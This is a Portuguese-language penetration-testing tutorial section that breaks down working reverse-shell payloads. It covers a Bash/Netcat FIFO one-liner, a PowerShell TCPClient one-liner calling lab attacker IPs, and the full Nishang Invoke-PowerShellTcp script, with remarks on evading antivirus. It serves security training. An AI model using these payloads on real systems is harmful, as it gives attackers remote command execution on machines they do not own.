`Have you ever sent an email or text to someone?`

A carga útil de um pacote de dados na Internet é a mensagem pretendida, mas em segurança da informação, refere-se ao código ou comando que explora vulnerabilidades em sistemas ou aplicativos para executar ações maliciosas. Por exemplo, o Windows Defender pode bloquear uma carga útil do PowerShell por considerá-la maliciosa. 

Quando entregamos e executamos payloads, estamos dando instruções ao computador alvo sobre o que fazer. É importante compreender o funcionamento real do código e dos comandos ao trabalhar com payloads, em vez de romantizar o processo como algo misterioso.
 
## One-Liners examinados
#### Netcat/Bash Reverse Shell One-liner
```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

s comandos acima compõem um one-liner comum emitido em um sistema Linux para servir um shell Bash em um soquete de rede utilizando um ouvinte Netcat.

Ele é frequentemente copiado e colado, mas não é frequentemente compreendido. Vamos dividir cada parte do one-liner:

#### Remover /tmp/f
```shell-session
rm -f /tmp/f; 
```
Remove o arquivo `/tmp/f` se ele existir, `-f` faz `rm` ignorar arquivos inexistentes. O ponto e vírgula ( `;`) é usado para executar o comando sequencialmente.

#### Faça um arquivo de pipe nomeado
```shell-session
mkfifo /tmp/f; 
```
Cria um [arquivo de pipe nomeado FIFO](https://man7.org/linux/man-pages/man7/fifo.7.html) no local especificado. Neste caso, /tmp/f é o arquivo de pipe nomeado FIFO, o ponto e vírgula ( `;`) é usado para executar o comando sequencialmente.

#### Redirecionamento de saída
```shell-session
cat /tmp/f | 
```
Concatena o arquivo de pipe nomeado FIFO /tmp/f, o pipe ( `|`) conecta a saída padrão de cat /tmp/f à entrada padrão do comando que vem depois do pipe ( `|`).

#### Definir opções de shell
```shell-session
/bin/bash -i 2>&1 | 
```
Especifica o interpretador de linguagem de comando usando a `-i`opção para garantir que o shell seja interativo. `2>&1`garante que o fluxo de dados de erro padrão ( `2`) `&`e o fluxo de dados de saída padrão ( `1`) sejam redirecionados para o comando após o pipe ( `|`).

#### Abra uma conexão com o Netcat
```shell-session
nc 10.10.14.12 7777 > /tmp/f  
```
Usa Netcat para enviar uma conexão para nosso host de ataque `10.10.14.12`escutando na porta `7777`. A saída será redirecionada ( `>`) para /tmp/f, servindo o shell Bash para nosso ouvinte Netcat em espera quando o comando reverse shell one-liner for executado

## PowerShell One-liner explicado
Os shells e payloads que escolhemos usar dependem amplamente de qual SO estamos atacando. Tenha isso em mente à medida que continuamos no módulo. Testemunhamos isso na seção de shells reversos ao estabelecer um shell reverso com um sistema Windows usando o PowerShell. Vamos analisar o one-liner que usamos:

#### Powershell One-Liner
```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Dissecaremos o comando PowerShell bastante grande que você pode ver acima. Pode parecer muito, mas espero que possamos desmistificá-lo um pouco.

#### Chamando o PowerShell
```cmd-session
powershell -nop -c 
```
Executa `powershell.exe`sem perfil ( `nop`) e executa o bloco de comando/script ( `-c`) contido nas aspas. Este comando em particular é emitido dentro do prompt de comando, e é por isso que o PowerShell está no início do comando.

É bom saber como fazer isso se descobrirmos uma vulnerabilidade de Execução Remota de Código que nos permite executar comandos diretamente em `cmd.exe`.

#### Ligando um soquete
```cmd-session
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```
Define/avalia a variável `$client`igual a ( `=`) o `New-Object`cmdlet, que cria uma instância do `System.Net.Sockets.TCPClient`objeto do .NET framework. O objeto do .NET framework se conectará ao soquete TCP listado entre parênteses `(10.10.14.158,443)`. O ponto e vírgula ( `;`) garante que os comandos e o código sejam executados sequencialmente.

#### Configurando o fluxo de comando
```cmd-session
$stream = $client.GetStream();
```
Define/avalia a variável `$stream`igual a ( `=`) a `$client`variável e o método do framework .NET chamado [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) que facilita as comunicações de rede. O ponto e vírgula ( `;`) garante que os comandos e o código sejam executados sequencialmente.

#### Fluxo de bytes vazio
```cmd-session
[byte[]]$bytes = 0..65535|%{0}; 
```
Cria um array de tipo byte ( `[]`) chamado `$bytes`que retorna 65.535 zeros como valores no array. Este é essencialmente um fluxo de bytes vazio que será direcionado ao ouvinte TCP em uma caixa de ataque aguardando uma conexão.

#### Parâmetros de fluxo
```cmd-session
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```
Inicia um loop while contendo a variável `$i` definida como igual a (`=`) o método Stream.Read (``$stream.Read``) do .NET framework. Os parâmetros: buffer (``$bytes``), offset (``0``) e count (``$bytes.Length``) são definidos dentro dos parênteses do método.

#### Set The Byte Encoding
```cmd-session
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```
Define/avalia a variável `$data`igual a ( `=`) uma classe de framework .NET de codificação [ASCII](https://en.wikipedia.org/wiki/ASCII) que será usada em conjunto com o `GetString`método para codificar o fluxo de bytes ( `$bytes`) em ASCII. Em resumo, o que digitamos não será apenas transmitido e recebido como bits vazios, mas será codificado como texto ASCII. O ponto e vírgula ( `;`) garante que os comandos e o código sejam executados sequencialmente.

#### Invocar-Expressão
```cmd-session
$sendback = (iex $data 2>&1 | Out-String ); 
```
Define/avalia a variável `$sendback` igual a ( `=`) o cmdlet Invoke-Expression ( `iex`) contra a variável `$data`, então redireciona o erro padrão ( `2>`) `&` saída padrão ( `1`) através de um pipe ( `|`) para o `Out-String` cmdlet que converte objetos de entrada em strings. Como Invoke-Expression é usado, tudo armazenado em $data será executado no computador local. O ponto e vírgula ( `;`) garante que os comandos e o código sejam executados sequencialmente.

#### Mostrar diretório de trabalho
```cmd-session
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```
Define/avalia a variável `$sendback2` igual a ( `=`) a variável `$sendback` mais ( `+`) a string PS ( `'PS'`) mais `+` o caminho para o diretório de trabalho ( `(pwd).path`) mais ( `+`) a string `'> '`. Isso resultará no prompt do shell sendo PS C:\workingdirectoryofmachine >. O ponto e vírgula ( `;`) garante que os comandos e o código sejam executados sequencialmente. Lembre-se de que o operador + na programação combina strings quando valores numéricos não estão em uso, com exceção de certas linguagens como C e C++, onde uma função seria necessária.

#### Define Sendbyte
```cmd-session
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```
Define/avalia a variável `$sendbyte` igual a ( `=`) o fluxo de bytes codificado em ASCII que usará um cliente TCP para iniciar uma sessão do PowerShell com um ouvinte Netcat em execução na caixa de ataque.

#### Encerrar conexão TCP
```cmd-session
$client.Close()"
```
Este é o método [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) que será usado quando a conexão for encerrada.

O one-liner que acabamos de examinar juntos também pode ser executado na forma de um script PowerShell ( `.ps1`). Podemos ver um exemplo disso visualizando o código-fonte abaixo. Este código-fonte é parte do projeto [nishang :](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```

## As cargas úteis assumem diferentes formas e tamanhos

Entender o que diferentes tipos de payloads estão fazendo pode nos ajudar a entender por que o AV está nos bloqueando da execução e nos dar uma ideia do que podemos precisar mudar em nosso código para contornar restrições. Isso é algo que exploraremos mais neste módulo. Por enquanto, entenda que os payloads que usamos para obter um shell em um sistema serão amplamente determinados por qual SO, linguagens de interpretador de shell e até mesmo linguagens de programação estão presentes no alvo.

Nem todos os payloads são one-liners e implantados manualmente como aqueles que estudamos nesta seção. Alguns são gerados usando frameworks de ataque automatizados e implantados como um ataque pré-empacotado/automatizado para obter um shell. Como no muito poderoso `Metasploit-framework`, com o qual trabalharemos na próxima seção.



























































































